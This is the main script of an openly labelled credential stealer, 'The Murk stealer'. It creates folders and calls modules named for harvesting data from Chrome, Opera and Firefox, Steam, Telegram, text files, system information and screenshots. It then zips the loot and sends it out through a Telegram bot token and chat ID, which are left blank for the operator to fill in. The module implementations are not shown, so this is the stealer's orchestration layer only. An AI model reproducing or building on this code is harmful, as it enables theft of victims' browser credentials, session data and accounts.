#-----------------------------------------------------------------------------#
#████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗#
#╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝#
#░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░#
#░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░#
#░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗#
#░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝#
#                        by: Nick_Vinesmoke                                   #
#                 https://github.com/Nick-Vinesmoke                           #
#         https://github.com/Nick-Vinesmoke/The-Murk-stealer                  #
#-----------------------------------------------------------------------------#
userTOKEN = ''
userCHAT_ID = ''






from modules.others import folder
from modules.system import sys
from modules.system import screen
from modules.browsers import chrome
from modules.browsers import opera
from modules.browsers import firefox
from modules.others import telegram
from modules.others import sender
from modules.others import makeitclean
from modules.others import steam
from modules.system import txt



folder.makeFolders()
chrome.Chrome()
opera.Opera()
firefox.Firefox()
steam.Steam()
sys.SystemInfo()
txt.TxtSteal()
telegram.Telegram()
screen.Screenshot()

try:
    makeitclean.makemeZip()
except Exception as e:
    print(e)
try:
    sender.Send(userTOKEN,userCHAT_ID)
except Exception as e:
    print(e)